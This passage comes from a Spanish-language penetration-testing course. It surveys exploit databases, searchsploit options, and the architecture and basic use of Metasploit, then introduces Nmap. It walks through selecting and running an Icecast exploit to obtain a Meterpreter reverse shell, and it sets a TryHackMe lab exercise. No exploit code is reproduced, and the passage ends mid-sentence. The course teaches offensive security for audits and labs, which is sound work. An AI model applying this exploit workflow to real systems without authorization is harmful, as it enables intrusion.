<p>Esta informaci\u00f3n tambi\u00e9n se pone a disposici\u00f3n de los proveedores de seguridad. Para las vulnerabilidades de ciberseguridad conocidas p\u00fablicamente hay organizaciones que enumeran cada vulnerabilidad y proporcionan un n\u00famero de identificaci\u00f3n, una descripci\u00f3n y al menos una referencia p\u00fablica.</p>"},{"location":"segof/exploit/#exploits-desconocidos","title":"Exploits desconocidos","text":"<p>Los exploits desconocidos para todos, excepto para las personas que los desarrollaron, se denominan exploits de d\u00eda cero. Estos son, con mucho, los exploits m\u00e1s peligrosos, ya que ocurren cuando un software o una arquitectura de sistema contiene una vulnerabilidad de seguridad cr\u00edtica que el proveedor desconoce.</p> <p>La vulnerabilidad se da a conocer cuando se detecta que un cibercriminal explota la vulnerabilidad, de ah\u00ed el t\u00e9rmino explotaci\u00f3n de d\u00eda cero.</p> <p>Una vez que se produce una explotaci\u00f3n de este tipo, los sistemas que ejecutan el exploit son vulnerables a un ciberataque. O bien el proveedor finalmente lanzar\u00e1 un parche para corregir la vulnerabilidad o el software de seguridad detecta y bloquea el exploit y el malware resultante.</p>"},{"location":"segof/exploit/#principales-bases-de-datos-de-exploits","title":"Principales bases de datos de exploits","text":""},{"location":"segof/exploit/#exploit-db","title":"Exploit DB","text":"<p>Esta es una de las bases de datos de exploits gratuitos m\u00e1s populares, conocida como \u201cExploit DB\u201c. Este proyecto de Offensive Security tiene como objetivo ser una colecci\u00f3n de exploits p\u00fablicos y software vulnerable disponible para la investigaci\u00f3n de vulnerabilidades y pruebas de intrusi\u00f3n.</p> <p></p> <p>D\u00eda a d\u00eda, la lista de exploits se crea recopilando exploits de fuentes p\u00fablicas y privadas, y se presenta en una interfaz f\u00e1cil de usar que le permite buscar r\u00e1pidamente en la base de datos. Desde esta \u00e1rea podr\u00e1s buscar exclusivamente exploits, o tanto exploits como aplicaciones vulnerables, e incluso crear filtros para personalizar tu b\u00fasqueda por autor, tipo de plataforma, tags y mucho m\u00e1s.</p> <p></p>"},{"location":"segof/exploit/#rapid7","title":"Rapid7","text":"<p>Las personas detr\u00e1s de Metasploit son conocidas por la alta calidad en sus productos de infosec, y lo mismo ocurre con las vulnerabilidades y la base de datos de exploits de su sitio web.</p> <p>Rapid7 ofrece una forma r\u00e1pida y pr\u00e1ctica de buscar vulnerabilidades y exploits (m\u00f3dulos), lo que le permite explorar los resultados de cualquier consulta determinada.</p> <p>Una vez que obtenga los resultados, podr\u00e1s descubrir m\u00e1s informaci\u00f3n sobre la vulnerabilidad, con instrucciones exactas para ejecutar este exploit desde la consola de metasploit.</p>"},{"location":"segof/exploit/#cxsecurity","title":"CXSecurity","text":"<p>Esta base de datos ofrece acceso directo a los exploits m\u00e1s recientes desde una interfaz web, donde se podr\u00e1 filtrar y encontrar exploits para vulnerabilidades locales o remotas, obtener el nivel de riesgo y otros detalles, como el autor y la fecha de publicaci\u00f3n.</p>"},{"location":"segof/exploit/#vulnerability-lab","title":"Vulnerability Lab","text":"<p>Vulnerability Lab ofrece acceso a una gran base de datos de vulnerabilidades con exploits y PoC (Proof of Concept) con fines de investigaci\u00f3n.</p> <p>Incluye detalles completos sobre la vulnerabilidad, como fecha, puntaje de riesgo, versi\u00f3n afectada, tipo de vulnerabilidad (remota o local), autor, clase de vulnerabilidad y m\u00e1s.</p>"},{"location":"segof/exploit/#0day","title":"0day","text":"<p>Tambi\u00e9n conocido como Inj3ct0r, 0day afirma ser la BD de explotaci\u00f3n m\u00e1s grande del mundo, una forma de servicio completo para descubrir, comprar y vender exploits de forma an\u00f3nima a cualquier persona mediante el uso de monedas digitales como Bitcoin, Litecoin y Ethereum.</p> <p>El tipo de exploits que se pueden encontrar en esta base de datos incluye local, remoto DoS, PoC, shellcode y otros.</p> <p>Al navegar por su base de datos, se pueden ver detalles de exploits, como la fecha de publicaci\u00f3n, la descripci\u00f3n, la plataforma afectada, los hits, la puntuaci\u00f3n de riesgo, el costo del exploit y el autor. El sitio web est\u00e1 traducido a m\u00e1s de una docena de idiomas y afirma que se public\u00f3 \u00fanicamente con fines educativos.</p>"},{"location":"segof/exploit/#securityfocus","title":"SecurityFocus","text":"<p>SecurityFocus es una comunidad basada en Symantec creada para compartir CVE e informaci\u00f3n de exploits con desarrolladores e investigadores de seguridad en una ubicaci\u00f3n centralizada.</p> <p>Ofrece acceso directo a CVE y exploits desde una interfaz web f\u00e1cil de navegar donde puede encontrar vulnerabilidades y filtrar los resultados por proveedor, t\u00edtulo y versi\u00f3n de software.</p> <p>Si bien SecurityFocus es un servicio \u00fatil, no se ha actualizado desde julio de 2019. No se encontrar\u00e1n las \u00faltimas vulnerabilidades en \u00e9l.</p>"},{"location":"segof/exploit/#packet-storm-security","title":"Packet Storm Security","text":"<p>Packet Storm Security es una comunidad de exploits dedicada a compartir vulnerabilidades y avisos, as\u00ed como informaci\u00f3n sobre PoC, demostraciones y exploits en funcionamiento para vulnerabilidades locales y remotas.</p> <p>Una de las mejores cosas de este sitio es que siempre est\u00e1 actualizado para incluir las \u00faltimas vulnerabilidades para una amplia gama de aplicaciones.</p>"},{"location":"segof/exploit/#google-hacking-database","title":"Google Hacking Database","text":"<p>Si bien estos no son \u201cexploits\u201d oficiales sino m\u00e1s bien Google Dorks, funcionan de la misma manera que un exploit tradicional, pero en lugar de usar c\u00f3digo en sus propias aplicaciones o servicios, conf\u00eda en el lenguaje de sintaxis del motor de b\u00fasqueda de Google para ejecutar comandos. y obtener la informaci\u00f3n que necesita.</p> <p>Google Hacking Database es un proyecto del dominio Exploit-DB.com, una forma alternativa de encontrar aplicaciones vulnerables y extraer informaci\u00f3n o de obtener privilegios.</p>"},{"location":"segof/exploit/#exploit-db-y-searchsploit","title":"Exploit-db y searchsploit","text":"<p>Esta base de datos de exploits es mantenida por Offensive Security, una empresa de formaci\u00f3n en ciberseguridad que ofrece diversas certificaciones de seguridad de la informaci\u00f3n (siendo OSCP la m\u00e1s famosa), as\u00ed como servicios de pruebas de intrusi\u00f3n de alto nivel. Exploit Database es un proyecto sin \u00e1nimo de lucro que Offensive Security proporciona como servicio p\u00fablico.</p> <p>La base de datos de exploits, que cumple con CVE, es un archivo p\u00fablico de exploits, as\u00ed como el software vulnerable correspondiente, desarrollado para su uso por pentesters e investigadores de vulnerabilidades. Su objetivo es ofrecer la colecci\u00f3n m\u00e1s completa de exploits recopilados a trav\u00e9s de env\u00edos directos, listas de correo y otras fuentes p\u00fablicas, y presentarlos en una base de datos de f\u00e1cil navegaci\u00f3n y de libre acceso. La base de datos de exploits es un repositorio de exploits y pruebas de conceptos en lugar de avisos, lo que la convierte en un recurso valioso para quienes necesitan datos procesables de inmediato.</p>"},{"location":"segof/exploit/#searchsploit","title":"Searchsploit","text":"<p>SearchSploit es una herramienta de b\u00fasqueda de l\u00ednea de comandos para Exploit-DB que permite tener una copia de la base de datos de exploits. Searchsploit est\u00e1 incluido en el repositorio de Exploit Database en GitHub.</p> <p>Tambi\u00e9n viene instalado por defecto en algunas de las distribuciones de seguridad m\u00e1s conocidas como Kali o Parrot.</p>"},{"location":"segof/exploit/#uso-de-searchsploit","title":"Uso de searchsploit","text":"<p>Si escribimos en el terminal:</p> <pre><code>$ searchsploit\n</code></pre> <p>Se nos ofrece informaci\u00f3n completa sobre el uso de searchsploit:</p> <p></p>"},{"location":"segof/exploit/#busqueda-por-titulo","title":"B\u00fasqueda por t\u00edtulo","text":"<p>El uso de la opci\u00f3n <code>-t</code> habilita el par\u00e1metro \u201ct\u00edtulo\u201d para buscar un exploit con un t\u00edtulo espec\u00edfico. </p> <p>Porque por defecto, searchsploit intentar\u00e1 tanto el t\u00edtulo del exploit como la ruta. La b\u00fasqueda de un exploit con un t\u00edtulo espec\u00edfico da resultados r\u00e1pidos y ordenados.</p> <p></p> <p>El comando anterior buscar\u00e1 un exploit relacionado con el CMS gym y mostrar\u00e1 todos los exploits disponibles en la base de datos exploit-db.</p>"},{"location":"segof/exploit/#busqueda-avanzada-de-titulos","title":"B\u00fasqueda avanzada de t\u00edtulos","text":"<p>Incluso se puede usar la opci\u00f3n <code>-t</code>, para obtener un resultado m\u00e1s preciso al encontrar la vulnerabilidad de cualquier plataforma en particular. </p> <p>Por ejemplo, si queremos buscar vulnerabilidades para Vmware pero \u00fanicamente para Linux, haremos</p> <p></p>"},{"location":"segof/exploit/#copiar-al-portapapeles","title":"Copiar al portapapeles","text":"<p>Al usar la opci\u00f3n <code>-p</code> se muestra la ruta completa de un exploit.</p> <p>Esta opci\u00f3n proporciona m\u00e1s informaci\u00f3n relacionada con el exploit, as\u00ed como tambi\u00e9n copia la ruta completa del exploit al portapapeles, todo lo que se necesitas es presionar las teclas Ctrl + V para pegar.</p> <p></p>"},{"location":"segof/exploit/#copiar-al-directorio","title":"Copiar al directorio","text":"<p>La opci\u00f3n -m copia un exploit en el directorio de trabajo actual. Esta opci\u00f3n proporciona la misma informaci\u00f3n que la anterior relacionada con el exploit, pero tambi\u00e9n copia el exploit en tu directorio actual de trabajo.</p> <p></p>"},{"location":"segof/exploit/#examinar-un-exploit","title":"Examinar un exploit","text":"<p>Con la opci\u00f3n --examine, se puede leer la funcionalidad de ese exploit con la ayuda del paginador pertinente.</p> <pre><code>searchsploit 39166 --examine\nsearchsploit -x 39166\n</code></pre>"},{"location":"segof/exploit/#mostrar-url-de-exploit-db","title":"Mostrar URL de Exploit-DB","text":"<p>Con la opci\u00f3n <code>-w</code>, se muestra la URL de Exploit-DB.com en lugar de la ruta local. En dicho sitio web obtendr\u00e1s informaci\u00f3n m\u00e1s detallada, como CVE-ID, archivos de configuraci\u00f3n, etiquetas y asignaciones de vulnerabilidad que no se incluyen en searchsploit.</p> <p></p>"},{"location":"segof/exploit/#excluir-resultados-no-deseados","title":"Excluir resultados no deseados","text":"<p>Al usar la opci\u00f3n <code>--exclude</code>, se habilita el par\u00e1metro de exclusi\u00f3n para eliminar los resultados no deseados dentro de la lista de exploits. Tambi\u00e9n puedes eliminar varios t\u00e9rminos separando los t\u00e9rminos con un \u201c|\u201d (pipe). </p> <p></p>"},{"location":"segof/exploit/#distinguir-mayusculas-y-minusculas","title":"Distinguir may\u00fasculas y min\u00fasculas","text":"<p>Al usar la opci\u00f3n <code>-c</code>, se puede realizar una b\u00fasqueda que distingue entre may\u00fasculas y min\u00fasculas. E21sto permite descubrir la vulnerabilidad relacionada con la menci\u00f3n de caracteres espec\u00edficos en el comando, de manera predeterminada hace una b\u00fasqueda insensitive.</p> <p></p>"},{"location":"segof/exploit/#ejercicios-exploit","title":"Ejercicios exploit","text":"<p>De la misma forma que se ha mostrado aqu\u00ed, realizad un escaneo de puertos sobre la m\u00e1quina Ignite de TryHackMe</p> <p>Fij\u00e1os bien en la informaci\u00f3n obtenida y buscad alg\u00fan exploit que pueda usarse contra ella. Para obtener una reverse shell, pod\u00e9is hacer uso de este recurso. </p> <p>El objetivo final es conseguir la flag de usuario (user.txt).</p>"},{"location":"segof/metasploit/","title":"Metasploit","text":""},{"location":"segof/metasploit/#que-es-metasploit","title":"\u00bfQu\u00e9 es Metasploit?","text":"<p>Metasploit es un proyecto de c\u00f3digo abierto para la seguridad inform\u00e1tica, que proporciona informaci\u00f3n acerca de vulnerabilidades de seguridad y ayuda en tests de penetraci\u00f3n \"Pentesting\" y el desarrollo de firmas para sistemas de detecci\u00f3n de intrusos.</p> <p>Su subproyecto m\u00e1s conocido es el Metasploit Framework, una herramienta para desarrollar y ejecutar exploits contra una m\u00e1quina remota.</p> <p></p>"},{"location":"segof/metasploit/#metasploit-framework-msf","title":"Metasploit framework (MSF)","text":"<p>Metasploit framework es una herramienta desarrollada en Perl y Ruby en su mayor parte, que est\u00e1 enfocada a auditores de seguridad y equipos Red Team y Blue Team.</p> <p>Red Team es el equipo ofensivo o encargado del hacking \u00e9tico, que hace pruebas de intrusi\u00f3n, mientras que el Blue Team es el equipo que lleva a cabo la securizaci\u00f3n y toda la parte defensiva.</p>"},{"location":"segof/metasploit/#caracteristicas-principales","title":"Caracter\u00edsticas principales","text":"<p>Es una herramienta muy completa que tiene much\u00edsimos exploits, que son vulnerabilidades conocidas, en las cuales tienen tambi\u00e9n unos m\u00f3dulos, llamados payloads, que son los c\u00f3digos que explotan estas vulnerabilidades.</p> <p>Tambi\u00e9n dispone de otros tipo de m\u00f3dulos, por ejemplo, los encoders, que son una especie de c\u00f3digos de cifrado para evasi\u00f3n de antivirus o sistemas de seguridad perimetral.</p> <p>Otra de las ventajas de este framework es que nos permite interactuar tambi\u00e9n con herramientas externas, como Nmap o Nessus.</p> <p>Adem\u00e1s ofrece la posibilidad de exportar nuestro malware a cualquier formato, ya sea en sistemas Unix o Windows.</p> <p>Destacar tambi\u00e9n que es multiplataforma y gratuita, aunque tiene una versi\u00f3n de pago, en la que se nos ofrecen exploits ya desarrollados, pero cuyo coste es bastante elevado. La versi\u00f3n gratuita es muy interesante porque contiene todas las vulnerabilidades p\u00fablicas.</p>"},{"location":"segof/metasploit/#arquitectura-de-msf","title":"Arquitectura de MSF","text":"<p>Metasploit est\u00e1 formado por varios componentes como bibliotecas, m\u00f3dulos, complementos y herramientas importantes. Una peque\u00f1o esquema de la estructura de Metasploit podr\u00eda ser el siguiente:</p> <p></p> <p>El dise\u00f1o modular facilita la expansi\u00f3n y adaptaci\u00f3n del framework de acuerdo a sus respectivos requerimientos, esto es debido a que las funcionalidades ya existentes pueden ser f\u00e1cilmente reutilizadas.</p> <p>A continuaci\u00f3n una brev\u00edsima rese\u00f1a de los componentes individuales.</p>"},{"location":"segof/metasploit/#ruby-extension-library-rex","title":"Ruby Extension Library (REX)","text":"<p>La biblioteca de extensi\u00f3n de Ruby (Ruby Extension Library) es el componente b\u00e1sico del framework. Contiene una variedad de clases que pueden ser utilizadas por las capas subyacentes o directamente por otras herramientas. </p> <p>Se utiliza para manejar diversas funciones de bajo nivel dentro de la plataforma. Esta biblioteca es fundamental para el funcionamiento de Metasploit, ya que proporciona herramientas y m\u00e9todos esenciales que permiten la interacci\u00f3n con redes, el manejo de sockets, la codificaci\u00f3n de datos y otras tareas cr\u00edticas. Algunas de las caracter\u00edsticas principales de Rex incluyen:</p> <p>+ Manejo de Sockets: Proporciona herramientas para crear y gestionar conexiones de red, incluyendo TCP, UDP y SSL, esenciales para realizar ataques y explotaci\u00f3n de vulnerabilidades.</p> <ul> <li> <p>Codificaci\u00f3n y Decodificaci\u00f3n de Datos: Incluye m\u00e9todos para convertir datos a diferentes formatos como base64, hexadecimal, y otros, permitiendo que los exploits se transmitan de manera encubierta y compatible.</p> </li> <li> <p>Manipulaci\u00f3n de Archivos y Sistema Operativo: Facilita la creaci\u00f3n y gesti\u00f3n de archivos y directorios en sistemas comprometidos, as\u00ed como el acceso y la ejecuci\u00f3n de comandos en esos sistemas.</p> </li> <li> <p>Soporte de Protocolos: Implementa m\u00f3dulos para trabajar con protocolos de red comunes, como HTTP, FTP, SMB, y DNS, entre otros, lo cual es crucial para realizar exploraci\u00f3n y explotaci\u00f3n de sistemas de forma avanzada.</p> </li> <li> <p>Criptograf\u00eda y Compresi\u00f3n: Incluye herramientas para encriptar, desencriptar y comprimir datos, ayudando a mantener la confidencialidad y eficiencia de la transmisi\u00f3n de payloads.</p> </li> </ul> <p>En resumen, Rex permite a los m\u00f3dulos de Metasploit realizar operaciones de red y manipulaci\u00f3n de datos que ser\u00edan muy complejas de implementar de forma individual en cada m\u00f3dulo.</p>"},{"location":"segof/metasploit/#msf-core","title":"MSF-Core","text":"<p>msf-core es el n\u00facleo de Metasploit Framework, una colecci\u00f3n de bibliotecas y m\u00f3dulos esenciales que forman la base sobre la cual se ejecutan todas las funcionalidades de Metasploit. Este n\u00facleo facilita la gesti\u00f3n de todos los componentes de Metasploit, incluidos los m\u00f3dulos de exploits, payloads, auxiliares, y post-explotaci\u00f3n. Algunas de sus principales caracter\u00edsticas incluyen:</p> <ul> <li> <p>Gesti\u00f3n de m\u00f3dulos: msf-core organiza y carga m\u00f3dulos de manera estructurada, permitiendo que Metasploit tenga un cat\u00e1logo organizado de exploits, payloads, encoders, y nops (no-operation).</p> </li> <li> <p>Compatibilidad con m\u00faltiples plataformas: Facilita la portabilidad de Metasploit, permitiendo que funcione en distintos sistemas operativos (Linux, Windows, macOS) sin problemas de compatibilidad.</p> </li> <li> <p>Conexi\u00f3n con nibliotecas: msf-core se comunica con otras bibliotecas como Rex y msf-lib para manejar la l\u00f3gica de bajo nivel (manejo de sockets, encriptaci\u00f3n, etc.), permitiendo que los desarrolladores de m\u00f3dulos se enfoquen en el desarrollo de exploits sin preocuparse de estos aspectos t\u00e9cnicos.</p> </li> <li> <p>Control de desiones y gesti\u00f3n de estado: Ayuda a manejar sesiones, como las generadas por payloads como Meterpreter, permitiendo la interacci\u00f3n con sistemas comprometidos y la ejecuci\u00f3n de comandos remotos.</p> </li> <li> <p>Soporte para plugins y extensibilidad: msf-core permite la inclusi\u00f3n de plugins que ampl\u00edan sus funcionalidades, como integraciones con bases de datos y herramientas de gesti\u00f3n de vulnerabilidades, facilitando la extensibilidad de Metasploit.</p> </li> </ul> <p>En pocas palabras, msf-core es el esqueleto de Metasploit, sobre el cual se construyen y gestionan todas sus funcionalidades, asegurando una integraci\u00f3n fluida de todos los componentes y m\u00f3dulos del framework</p>"},{"location":"segof/metasploit/#exploits","title":"Exploits","text":"<p>Este modulo contiene programas y scripts dise\u00f1ados para explotar vulnerabilidades.</p>"},{"location":"segof/metasploit/#payloads","title":"Payloads","text":"<p>Los payloads se proporcionan aqu\u00ed, estos pueden ser usados tras una intrusi\u00f3n exitosa (explotaci\u00f3n) en el sistema objetivo.</p> <p>Un exploit es una vulnerabilidad, y el payload es la carga que se ejecuta en esa vulnerabilidad, es decir, la carga que activamos a la hora de aprovechar dicha vulnerabilidad.</p>"},{"location":"segof/metasploit/#codificadores-y-nops","title":"Codificadores y NOPs","text":"<p>Con el fin de hacer m\u00e1s dif\u00edcil la detecci\u00f3n del payload por de los sistemas IDS/IPS o programas antivirus, estos m\u00f3dulos ofrecen funciones para ofuscar el payload en redes.</p>"},{"location":"segof/metasploit/#auxiliar","title":"Auxiliar","text":"<p>El m\u00f3dulo auxiliar proporciona varios programas de escaneo para la recuperaci\u00f3n de informaci\u00f3n. Estos incluyen esc\u00e1ner de inicio de sesi\u00f3n, esc\u00e1ner de punto d\u00e9bil, sniffers de redes y esc\u00e1ner de puertos. </p>"},{"location":"segof/metasploit/#trabajando-con-msfcli","title":"Trabajando con msfcli","text":"<p>Metasploit viene instalado por defecto en las principales distribuciones Linux enfocadas a la seguridad.</p> <p>Para iniciar Metasploit, en primera instancia iniciaremos el servicio <code>postgresql</code> e iniciaremos la autoconfiguraci\u00f3n de la base de datos de este tipo que utilizar\u00e1 Metasploit para persistir algunos de sus datos. Tras ello, basta con iniciarl <code>msfcli</code>. Estas acciones las debemos llevar a cabo como root o, si el usuario est\u00e1 habilitado, utilizando sudo.</p> <p>Traducido a la l\u00ednea de comandos ser\u00eda as\u00ed.</p> <p>Iniciamos el servicio <code>postgresql</code>:</p> <p></p> <p>Inicializamos la base de datos para Metasploit:</p> <p></p> <p>Comprobaci\u00f3n de que ambas cosas est\u00e1n funcionando correctamente:</p> <p></p> <p>Finalmente, inciciamos msfcli.:</p> <p></p> <p>Una vez en el terminal de Metasploit, podemos escribir el comando <code>help</code> para investigar los comandos que tenemos a nuestra disposici\u00f3n:</p> <p></p> <p>Con el comando <code>show</code> podremos examinar todos los tipos de m\u00f3dulos:</p> <p> </p> <p>Tambi\u00e9n podremos realizar b\u00fasquedas entre todos los tipos de m\u00f3dulo con un motivo concreto (una vulnerabilidad, una funcionalidad como ser\u00eda un esc\u00e1ner...). E incluso podr\u00edamos restringir la b\u00fasqueda a que dicho motivo aparezca en el nombre y se realice \u00fanicamente entre un tipo de m\u00f3dulo.</p> <p>Por ejemplo, en la imagen de abajo se realiza una b\u00fasqueda de la vulnerabilidad MS17-010 y, a continuaci\u00f3n, se restringe la b\u00fasqueda a que esa expresi\u00f3n aparezca en el nombre del m\u00f3dulo y que adem\u00e1s \u00e9ste sea del tipo exploit. Es decir, estamos buscando un exploit para EternalBlue:</p> <p></p> <p>Recuadrado en rojo ya nos informa sobre c\u00f3mo utilizar el m\u00f3dulo que escojamos.</p> <p>Adem\u00e1s, se nos ofrece una informaci\u00f3n acerca de los m\u00f3dulos, como por ejemplo la fecha de aparici\u00f3n del m\u00f3dulo (disclosure date), si permite comprobar si la v\u00edctima u objetivo es vulnerable a ese exploit (check) o qu\u00e9 ranking tiene, entendiendo como ranking el nivel de fiabilidad del exploit o m\u00f3dulo del que se trate. </p> <p>Como curiosidad el ranking que se utiliza, de acuerdo con la documentaci\u00f3n oficial, es este:</p> <p></p> <p>Dado que Metasploit abarca un gran abanico de posibilidades y conocimientos, escapa por completo al prop\u00f3sito de este curso el impartir una formaci\u00f3n detallada del framework. Es por ello que s\u00edmplemente veremos unas \u00ednfimas pinceladas de sus posibilidades, relacionadas con el uso de exploits.</p> <p>Nota del autor</p> <p>Si bien es cierto que Metasploit es una herramienta de gran utilidad y que permite automatizar un gran n\u00famero de tareas, ahorrando de esta manera en ocasiones un tiempo valioso, se recomienda no ce\u00f1irse ni abusar de ella.</p> <p>Podr\u00edamos llegar a explotar vulnerabilidades graves y complejas de una forma relativamente sencilla mediante el uso de Metasploit. Sin embargo, el fin \u00faltimo de un estudiante de seguridad inform\u00e1tica ser\u00e1 entender las bases, los principios y funcionamientos internos con el mayor detalle posible. S\u00f3lo de esta manera podremos desarrollar adecuadamente nuestro perfil en ciberseguridad, as\u00ed como evitar futuros desastres.</p> <p>En resumen, siempre que se pueda, se recomienda la explotaci\u00f3n manual de las vulnerabilidades para su perfecta comprensi\u00f3n.</p>"},{"location":"segof/metasploit/#uso-de-exploits-en-metasploit","title":"Uso de exploits en Metasploit","text":"<p>Como ya se ha comentado, se presentar\u00e1 la forma m\u00e1s b\u00e1sica de uso de un exploit en Metasploit sin apenas entrar en detalle. Se deja a elecci\u00f3n del alumno profundizar tanto cuanto quiera en el tema con los m\u00faltiples recursos gratuitos o de pago que existen hoy d\u00eda en la red.</p> <p>Dicho esto, ilustraremos esta secci\u00f3n con un ejemplo.</p> <p>Supongamos que en una auditor\u00eda perfectamente legal hemos llevado a cabo un escaneo de puertos y hemos descubierto que la aplicaci\u00f3n de streaming Icecast est\u00e1 corriendo en su puerto por defecto, el 8000.</p> <p>Si tenemos iniciado Metasploit, buscaremos un exploit para esta aplicaci\u00f3n:</p> <p></p> <p>Podemos elegir el exploit a utilizar mediante el comando <code>use</code> seguido bien del n\u00famero del \u00edndice que nos muestra, como pasa en la imagen de arriba, o bien indic\u00e1ndole la ruta completa, como vemos abajo:</p> <p></p> <p>Una vez seleccionado el exploit a utilizar, debemos investigar que par\u00e1metros y opciones tiene para poder configurarlas adecuadamente. Esto lo haremos con <code>show options</code>:</p> <p></p> <p>Hay unas opciones comunes que aparecen en la pr\u00e1ctica totalidad de exploits puesto que casi siempre ir\u00e1n dirigidos a conseguir una shell inversa. Si lo consigue, nos devolver\u00e1 un terminal de Meterpreter. Estas opciones son:</p> <ul> <li>RHOSTS: Hace referencia a la IP del host remoto, v\u00edctima u objetivo</li> <li>RPORT: Hace referencia al puerto que atacaremos del objetivo</li> <li>LHOST: IP de la m\u00e1quina local a la que se conectar\u00e1 la reverse shell (es decir, nuestra propia IP)</li> <li>LPORT: El puerto de nuestra m\u00e1quina local que utilizar\u00e1 la reverse shell para conectarse desde la v\u00edctima</li> </ul> <p>Para establecer los valores de estas opciones o par\u00e1metros, utilizaremos el comando <code>set</code>, seguido del par\u00e1metro que queramos establecer y a continuaci\u00f3n el valor que le queremos dar, tal y como se muestra abajo:</p> <p></p> <p>As\u00ed pues, ya hemos establecido los valores necesarios para las opciones del exploit y hemos comprobado que todo est\u00e1 correcto. </p> <p>Ya estamos en condiciones de correr nuestro exploit y ver si tenemos \u00e9xito. Para llevar a cabo este cometido, podemos emplear el comando <code>run</code> o <code>exploit</code> indiferentemente:</p> <p></p> <p>Vemos como el exploit realiza una serie de acciones en background hasta que consigue devolvernos la shell inversa en formato Meterpreter. En esta shell comprobamos que efectivamente estamos dentro de la m\u00e1quina v\u00edctima, que es un Windows 7 y que lo hemos hecho con el usuario Dark.</p>"},{"location":"segof/nmap101/","title":"Nmap b\u00e1sico","text":""},{"location":"segof/nmap101/#que-son-los-puertos","title":"\u00bfQu\u00e9 son los puertos?","text":"<p>Ya hemos comentado que Nmap es el est\u00e1ndar de facto a la hora de realizar un esc\u00e1ner de puertos pero... \u00bfqu\u00e9 entendemos por puertos?</p> <p>En los sistemas operativos modernos, los puertos son direcciones numeradas para el tr\u00e1fico de red. Los diferentes tipos de servicios utilizan diferentes puertos de forma predeterminada.</p> <p>Por ejemplo, el tr\u00e1fico web normal usa el puerto 80, mientras que el correo electr\u00f3nico POP3 usa el puerto 110. Una de las formas en que funciona un firewall es permitiendo o restringiendo el tr\u00e1fico a trav\u00e9s de un puerto en particular.</p> <p>Dado que la configuraci\u00f3n del puerto puede suponer un riesgo para la seguridad, es fundamental saber qu\u00e9 puertos est\u00e1n abiertos y cu\u00e1les est\u00e1n bloqueados.</p>"},{"location":"segof/nmap101/#que-es-un-escaner-de-puertos","title":"\u00bfQu\u00e9 es un esc\u00e1ner de puertos?","text":"<p>Esta es una herramienta que se utiliza para descubrir y auditar redes, escanear y verificar vulnerabilidades en direcciones y puertos de Protocolo de Internet (IP) para una red determinada.</p> <p>Es usado por el administrador de red, gerente de TI o simplemente un profesional de seguridad de la empresa. Uno de los desaf\u00edos cr\u00edticos que enfrentar\u00e1n estos perfiles es batallar para saber qu\u00e9 se est\u00e1 ejecutando en su red y el tipo de problemas/desaf\u00edos de seguridad que plantean.</p> <p>Hay varias herramientas (incluido Nmap) disponibles para que los administradores de red las usen para monitorear su red y obtener actividades en tiempo real en su red:</p> <p>Con Nmap:</p> <ul> <li>Los administradores de red pueden identificar todos los dispositivos que se ejecutan o acceden a sus sistemas.</li> <li>Un administrador puede identificar todos los hosts, equipos conectados a su red, as\u00ed como los servicios que ofrecen.</li> <li>Un administrador puede escanear todos los puertos abiertos, dando prioridad a la seguridad, es decir, las detecciones de amenazas a la seguridad.</li> <li>Un administrador puede escanear/monitorear un solo host o miles de dispositivos conectados.</li> </ul> <p>Como se ha indicado al principio, Nmap es, con mucho, la herramienta de escaneo de red m\u00e1s utilizada. Es una herramienta de escaneo de puertos, lo que significa que recopila informaci\u00f3n de estos puertos. </p> <p>Nmap puede escucha las repsuestas de los sistemas y as\u00ed determinar si un puerto est\u00e1 abierto, cerrado o filtrado de una forma u otra por el firewall (un sistema dise\u00f1ado para denegar el acceso de usuarios no autorizados hacia o desde una red privada).</p> <p>Es una herramienta flexible y vers\u00e1til, lo que significa que puede adaptarse a diferentes actividades y funciones.</p> <p>Nota</p> <p>El escaneo de puertos tambi\u00e9n se puede denominar enumeraci\u00f3n o descubrimiento de puertos. Usaremos estos t\u00e9rminos indistintamente, mientras que significan lo mismo.</p> <p>Tal y como podemos leer en el propio site de Nmap:</p> <p>Cita</p> <p>Nmap utiliza paquetes IP sin procesar de formas novedosas para determinar qu\u00e9 hosts est\u00e1n disponibles en la red, qu\u00e9 servicios (nombre y versi\u00f3n de la aplicaci\u00f3n) ofrecen esos hosts, qu\u00e9 sistemas operativos (y versiones de SO) est\u00e1n ejecutando, qu\u00e9 tipo de filtros de paquetes/firewalls est\u00e1n en uso y decenas de otras caracter\u00edsticas.</p> <p>Fue dise\u00f1ado para escanear r\u00e1pidamente redes grandes, pero funciona bien contra hosts \u00fanicos. Nmap se ejecuta en todos los principales sistemas operativos de computadoras, y est\u00e1n disponibles versiones gr\u00e1ficas y de consola.</p>"},{"location":"segof/nmap101/#windows-o-linux","title":"Windows o Linux","text":"<p>Nmap se desarroll\u00f3 inicialmente para ejecutarse solo en sistemas basados en Unix. La versi\u00f3n de Windows se lanz\u00f3 en 2000, pero actualmente cuenta con algunas limitaciones que incluyen:</p> <ul> <li>No se pueden realizar escaneos tan en profundidad como en un sistema Unix (por ejemplo puede haber problemas con clientes VPN)</li> <li>No se puede escanear la propia m\u00e1quina </li> <li>Los escaneos en Windows, por la manera que tiene de formar los paquetes, puede resultar un poco m\u00e1s lenta en algunos casos</li> </ul> <p>Info</p> <p>Por lo tanto, se recomienda el uso de Nmap en Linux por una mayor rapidez, eficiencia y experiencia de uso.</p> <p>Es posible instalar la interfaz gr\u00e1fica \"Zenmap\" como frontend de Nmap aunque en este curso \u00fanicamente veremos su manejo en l\u00ednea de comandos en Linux.</p> <p>Este curso no cubre el proceso de instalaci\u00f3n de ninguna de las dos herramientas en ninguno de los dos SSOO ya que se da por sabido este proceso.</p>"},{"location":"segof/nmap101/#como-es-una-cabecera-tcp","title":"\u00bfC\u00f3mo es una cabecera TCP?","text":""},{"location":"segof/nmap101/#que-es-el-3-way-handshake","title":"\u00bfQu\u00e9 es el 3-way-handshake?","text":"<p>El 3-way handshake (o apret\u00f3n de manos de tres v\u00edas) es el proceso utilizado en el protocolo TCP (Transmission Control Protocol) para establecer una conexi\u00f3n confiable entre un cliente y un servidor antes de transmitir datos. Este proceso es clave para garantizar que ambas partes est\u00e9n listas para enviar y recibir datos, y que la conexi\u00f3n sea confiable.</p>"},{"location":"segof/nmap101/#proceso-del-3-way-handshake","title":"Proceso del 3-way handshake:","text":"<ol> <li>SYN (Solicitud de sincronizaci\u00f3n):<ul> <li>El cliente inicia la conexi\u00f3n enviando un segmento TCP con el flag SYN activado.</li> <li>El segmento incluye un n\u00famero de secuencia (sequence number), que en este caso ser\u00e1 un valor inicial (digamos, <code>seq = x</code>).</li> </ul> </li> </ol> <p>Prop\u00f3sito: El cliente informa al servidor que quiere iniciar una comunicaci\u00f3n y establece 